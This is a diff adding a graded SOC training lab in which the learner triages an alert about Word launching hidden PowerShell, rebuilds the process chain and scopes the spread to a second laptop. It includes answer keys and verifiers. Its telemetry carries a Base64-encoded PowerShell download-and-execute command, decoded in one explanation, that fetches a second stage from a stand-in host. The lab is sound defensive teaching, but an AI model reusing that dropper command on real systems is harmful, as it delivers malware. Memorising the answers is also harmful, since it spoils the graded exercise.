@@ -1,0 +1,99 @@
+slug: lab-siem-alert-triage
+lesson: siem-alert-investigation
+title: Triage an Office-spawns-PowerShell alert
+pass_mark: 80
+scenario: |
+  A high-severity alert has landed in your queue: Word on a Finance laptop started a command
+  shell. You pulled the alert and the surrounding endpoint telemetry (process, DNS and network
+  events) for the hour into two files.
+
+  Rebuild the process chain, decode what PowerShell was told to do (encoded commands are Base64
+  of UTF-16LE text; CyberChef's "From Base64" then "Decode text UTF-16LE" works, as does
+  `[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('...'))`), and scope how far it
+  spread before you decide on a verdict. Do not visit any address you find; they are reserved
+  `.example` and documentation addresses.
+artifacts:
+- name: alert.json
+  kind: json
+  description: The SIEM alert as raised.
+  content: |
+    {
+      "alert_id": "SOC-48213",
+      "rule": "Office application spawned a command shell",
+      "severity": "high",
+      "created": "2026-06-09T13:24:51Z",
+      "host": "FIN-LT-07",
+      "user": "CONTOSO\\j.alvarez",
+      "summary": "WINWORD.EXE started cmd.exe, which started powershell.exe with an encoded command"
+    }
+- name: endpoint_events.jsonl
+  kind: json
+  description: EDR events from the Finance laptops and one unrelated host, one JSON object per line.
+  content: |
+    {"time": "2026-06-09T13:24:40Z", "host": "FIN-LT-07", "event": "file_create", "process": "outlook.exe", "path": "C:\\Users\\j.alvarez\\Downloads\\Remittance_0609.docm"}
+    {"time": "2026-06-09T13:24:47Z", "host": "FIN-LT-07", "event": "process_start", "process": "winword.exe", "parent": "explorer.exe", "command_line": "WINWORD.EXE /n C:\\Users\\j.alvarez\\Downloads\\Remittance_0609.docm"}
+    {"time": "2026-06-09T13:24:50Z", "host": "FIN-LT-07", "event": "process_start", "process": "cmd.exe", "parent": "winword.exe", "command_line": "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBjAGQAbgAuAGUAeABhAG0AcABsAGUALwBzAHQAYQBnAGUALgB0AHgAdAAnACkA"}
+    {"time": "2026-06-09T13:24:50Z", "host": "FIN-LT-07", "event": "process_start", "process": "powershell.exe", "parent": "cmd.exe", "command_line": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBjAGQAbgAuAGUAeABhAG0AcABsAGUALwBzAHQAYQBnAGUALgB0AHgAdAAnACkA"}
+    {"time": "2026-06-09T13:24:51Z", "host": "FIN-LT-07", "event": "dns_query", "process": "powershell.exe", "query": "update-cdn.example", "answer": "203.0.113.80"}
+    {"time": "2026-06-09T13:24:52Z", "host": "FIN-LT-07", "event": "network_connect", "process": "powershell.exe", "dest_ip": "203.0.113.80", "dest_port": 80}
+    {"time": "2026-06-09T13:25:30Z", "host": "FIN-LT-07", "event": "network_connect", "process": "teams.exe", "dest_ip": "52.112.0.10", "dest_port": 443}
+    {"time": "2026-06-09T13:31:02Z", "host": "FIN-LT-11", "event": "process_start", "process": "winword.exe", "parent": "explorer.exe", "command_line": "WINWORD.EXE /n C:\\Users\\s.cho\\Downloads\\Remittance_0609.docm"}
+    {"time": "2026-06-09T13:31:05Z", "host": "FIN-LT-11", "event": "process_start", "process": "powershell.exe", "parent": "cmd.exe", "command_line": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBjAGQAbgAuAGUAeABhAG0AcABsAGUALwBzAHQAYQBnAGUALgB0AHgAdAAnACkA"}
+    {"time": "2026-06-09T13:31:06Z", "host": "FIN-LT-11", "event": "network_connect", "process": "powershell.exe", "dest_ip": "203.0.113.80", "dest_port": 80}
+    {"time": "2026-06-09T13:40:12Z", "host": "HR-LT-03", "event": "network_connect", "process": "chrome.exe", "dest_ip": "198.51.100.20", "dest_port": 443}
+    {"time": "2026-06-09T13:52:44Z", "host": "FIN-LT-07", "event": "network_connect", "process": "powershell.exe", "dest_ip": "203.0.113.80", "dest_port": 80}
+tasks:
+- prompt: Which program started the malicious chain on FIN-LT-07 (the parent of cmd.exe)?
+  type: text
+  accepted:
+  - winword.exe
+  - winword
+  - microsoft word
+  - word
+  hint: Follow the parent field upwards from powershell.exe.
+  explanation: winword.exe opened a macro-enabled attachment (.docm) and spawned cmd.exe, which spawned PowerShell.
+    Word should never need a shell, which is why the rule exists.
+  verify:
+    artifact: endpoint_events.jsonl
+    op: set
+    pattern: '"process": "cmd\.exe", "parent": "([^"]+)"'
+- prompt: Decode the PowerShell -enc argument. Which domain does it download from?
+  type: text
+  accepted:
+  - update-cdn.example
+  hint: Base64-decode the long argument after -enc, then read it as UTF-16LE (every other byte is zero).
+  explanation: 'It decodes to: IEX (New-Object Net.WebClient).DownloadString(''http://update-cdn.example/stage.txt'').
+    That downloads a second stage from update-cdn.example and runs it in memory, a classic macro dropper.'
+- prompt: What IP address did PowerShell connect to?
+  type: text
+  accepted:
+  - 203.0.113.80
+  hint: network_connect events where the process is powershell.exe.
+  explanation: 203.0.113.80, the address update-cdn.example resolved to. It is the indicator to block and to search
+    for across the estate.
+  verify:
+    artifact: endpoint_events.jsonl
+    op: set
+    pattern: '"process": "powershell\.exe", "dest_ip": "([^"]+)"'
+- prompt: Which hosts connected to that IP? List them separated by commas.
+  type: set
+  accepted:
+  - FIN-LT-07, FIN-LT-11
+  hint: Search every event for the destination IP, not just the alerting host.
+  explanation: FIN-LT-11 opened the same attachment seven minutes later and also called out. The alert only named
+    one host; scoping found a second victim.
+  verify:
+    artifact: endpoint_events.jsonl
+    op: set
+    pattern: '"host": "([^"]+)".*"dest_ip": "203\.0\.113\.80"'
+- prompt: What is your verdict?
+  type: choice
+  options:
+  - 'False positive: Word often starts PowerShell for add-ins'
+  - 'Benign true positive: an admin was testing a macro'
+  - 'True positive: escalate as an incident, isolate both laptops, block the domain and IP and purge the email'
+  - 'Inconclusive: close the alert and wait to see if it fires again'
+  answer: 2
+  hint: Consider the hidden window, the encoded download-and-run command and the second host.
+  explanation: A macro document launching hidden, encoded PowerShell that downloads code is malicious, and it hit
+    two hosts. Escalate, contain both laptops, block the indicators and remove the phishing email from all mailboxes.
